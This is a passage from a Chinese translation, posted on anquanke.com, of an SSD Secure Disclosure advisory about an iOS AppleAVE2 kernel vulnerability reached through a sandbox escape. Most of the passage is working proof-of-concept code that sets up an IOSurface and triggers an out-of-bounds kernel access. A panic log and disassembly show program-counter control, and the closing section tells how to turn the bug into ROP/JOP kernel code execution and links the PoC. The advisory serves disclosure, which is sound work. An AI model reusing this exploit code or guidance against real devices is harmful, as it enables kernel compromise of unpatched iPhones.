+        uint32_t surface_id = IOSurfaceRootUserClient_CreateSurface(surface_ioconn, &surface_map_addr, &surface_map_size);
+        NSLog(@"Got Surface ID: %d", surface_id);
+    
+        uintptr_t surface_data = malloc(surface_map_size);
+        bzero((void *)surface_data, surface_map_size);
+    
+        *(uint64_t *)(surface_data + 0x0) = 0x4141414142424242;     // First pointer to memory containing function pointer
+                                                                    // This field is the start of the block adjacent to the stats array
+        *(uint32_t *)(surface_data + 0x3420) = 6;                   // `memoryInfoCnt2` field, gives 1 OOB access
+    
+        // Sends the data to MIDIServer to be written onto the IOSurface
+        // The MIDIServer ROP chain hangs on the following call:
+        // vm_read_overwrite(ourtask, clientbuf, surface1_map_size, surface1_map_addr, ...)
+        send_overwriting_iosurface_map(surface_data, surface_map_size, surface_map_addr);
+    
+        // Waits for a message back from MIDIServer, sent by the ROP chain
+        // Notifies us that the vm_read_overwrite call completed  
+        reply_notify_completion();
+    
+        free(surface_data);
+    
+        {
+            // Write the OOB count value to the `currentClient` object, and write our adjacent data
+    
+            char setSessionSettings_inputStruct[0x108] = { 0 };
+            char setSessionSettings_outputStruct[0x4] = { 0 };
+            size_t setSessionSettings_outputStruct_size = sizeof(setSessionSettings_outputStruct);
+    
+            *(uint32_t *)(setSessionSettings_inputStruct + 0x04) = surface_id; // FrameQueueSurfaceId
+            *(uint32_t *)(setSessionSettings_inputStruct + 0x08) = surface_id; // InitInfoSurfaceId, vulnerable IOSurface mapping 
+            *(uint32_t *)(setSessionSettings_inputStruct + 0x0c) = surface_id; // ParameterSetsBuffer
+            *(uint32_t *)(setSessionSettings_inputStruct + 0xd0) = surface_id; // codedHeaderCSID & codedHeaderBuffer [0]
+            *(uint32_t *)(setSessionSettings_inputStruct + 0xd4) = surface_id; // codedHeaderCSID & codedHeaderBuffer [1]
+    
+            // AppleAVE2UserClient::_SetSessionSettings 
+            ret = IOConnectCallStructMethod(ioconn, 
+                                            7, 
+                                            setSessionSettings_inputStruct, 
+                                            sizeof(setSessionSettings_inputStruct), 
+                                            setSessionSettings_outputStruct, 
+                                            &setSessionSettings_outputStruct_size);
+            NSLog(@"SetSessionSettings: %x %s", ret, mach_error_string(ret));
+        }
+    
+        {
+            // Trigger the bug 
+    
+            char close_inputStruct[0x4] = { 0 };
+            char close_outputStruct[0x4] = { 0 };
+            size_t close_outputStruct_size = sizeof(close_outputStruct);
+    
+            // AppleAVE2UserClient::_my_close 
+            ret = IOConnectCallStructMethod(ioconn, 
+                                            1, 
+                                            close_inputStruct, 
+                                            sizeof(close_inputStruct), 
+                                            close_outputStruct, 
+                                            &close_outputStruct_size);
+            NSLog(@"my_close: %x %s", ret, mach_error_string(ret));
+        }
+    }
+    
+
+log:
+
+    
+    
+    panic(cpu 5 caller 0xfffffff007205df4): Kernel data abort. (saved state: 0xffffffe03cafaf40)
+          x0: 0x4141414142424242  x1:  0xffffffe02cb09c28  x2:  0x0000000000000000  x3:  0xffffffe02cb09c28
+          x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0xfffffff00f35bb54  x7:  0x0000000000000000
+          x8: 0x0000000000000006  x9:  0x0000000000000006  x10: 0x0000000000000001  x11: 0x0000000000080022
+          x12: 0x0000000000000022 x13: 0xffffffe00094bc08  x14: 0x0000000000080023  x15: 0x0000000000006903
+          x16: 0xfffffff00ee71740 x17: 0x0000000000000000  x18: 0xfffffff00ee79000  x19: 0x4141414142424242
+          x20: 0xffffffe02cb08000 x21: 0x0000000000000000  x22: 0xffffffe02cb09c28  x23: 0x0000000000000005
+          x24: 0xffffffe02cb2f748 x25: 0xffffffe02cb0d034  x26: 0x0000000000000050  x27: 0xffffffe004929218
+          x28: 0x0000000000000000 fp:  0xffffffe03cafb2a0  lr:  0xfffffff0069397e8  sp:  0xffffffe03cafb290
+          pc:  0xfffffff0069398dc cpsr: 0x80400304         esr: 0x96000004          far: 0x414141414242429a
+    
+
+可以看到pc对齐是在x0->0x58指令之前的分支:
+
+    
+    
+    0xFFFFFFF0069398CC IOSurfaceBufferMngr::CompleteFence
+    0xFFFFFFF0069398CC
+    0xFFFFFFF0069398CC                 STP             X20, X19, [SP,#-0x10+var_10]!
+    0xFFFFFFF0069398D0                 STP             X29, X30, [SP,#0x10+var_s0]
+    0xFFFFFFF0069398D4                 ADD             X29, SP, #0x10
+    0xFFFFFFF0069398D8                 MOV             X19, X0
+    0xFFFFFFF0069398DC                 LDR             X0, [X0,#0x58]                 // Faults here 
+    0xFFFFFFF0069398E0                 CBZ             X0, loc_FFFFFFF006939908
+    0xFFFFFFF0069398E4                 LDRB            W8, [X19,#0x1E]
+    0xFFFFFFF0069398E8                 CBNZ            W8, loc_FFFFFFF006939908
+    0xFFFFFFF0069398EC                 MOV             W1, #0
+    0xFFFFFFF0069398F0                 BL              IOFence__complete
+    0xFFFFFFF0069398F4                 LDR             X0, [X19,#0x58]
+    0xFFFFFFF0069398F8                 LDR             X8, [X0]
+    0xFFFFFFF0069398FC                 LDR             X8, [X8,#0x28]
+    0xFFFFFFF006939900                 BLR             X8
+    [...]
+    
+
+###  Exploitation
+
+一旦逃逸了沙盒，利用这个漏洞就非常简单。
+
+PoC中的代码也可用于EXP，但是SetSessionSettings缓冲区（0x4141414142424242）中提供的值必须指向可控的内核缓冲区，可以从该缓冲区加载函数指针。另外一个堆信息泄漏的漏洞可以用于稳定性保证。在kASLR失败的情况下，还可以根据每个设备推测堆的位置:在堆内存高地址测试下，大量的分配很可能会在相同的内存范围(0xffffffffe1xxxxxxxx)。
+
+因为这个漏洞可以让我们控制PC，所以它可以通过ROP或JOP进行利用。虽然不一定适用于有PAC的A12或更新版本的设备，但非A12 /
+A13是支持我们沙盒逃逸，还要注意，在构建ROP / JOP链时，可控内核缓冲区的地址在x19内，另一个可控指针在x0内，可以用作stack
+pivot或暂存内存空间。
+
+poc地址：<https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%204066/poc>
+
+本文翻译自SSD Secure Disclosure,[原文链接](https://ssd-disclosure.com/archives/4066/ssd-advisory-via-ios-jailbreak-sandbox-escape-and-kernel-r-w-leading-to-rce "原文链接")。
+
+本文翻译自ssd-disclosure.com [原文链接](https://ssd-disclosure.com/archives/4066/ssd-advisory-via-ios-jailbreak-sandbox-escape-and-kernel-r-w-leading-to-rce)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **qwert** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/195619](/post/id/195619)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [ssd-disclosure.com](https://ssd-disclosure.com/archives/4066/ssd-advisory-via-ios-jailbreak-sandbox-escape-and-kernel-r-w-leading-to-rce)
+
+如若转载,请注明出处： <https://ssd-disclosure.com/archives/4066/ssd-advisory-via-ios-jailbreak-sandbox-escape-and-kernel-r-w-leading-to-rce>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [漏洞分析](/tag/漏洞分析)
+  * [移动安全](/tag/移动安全)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p2.ssl.qhimg.com/t01de37baca165a5b78.png) qwert
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
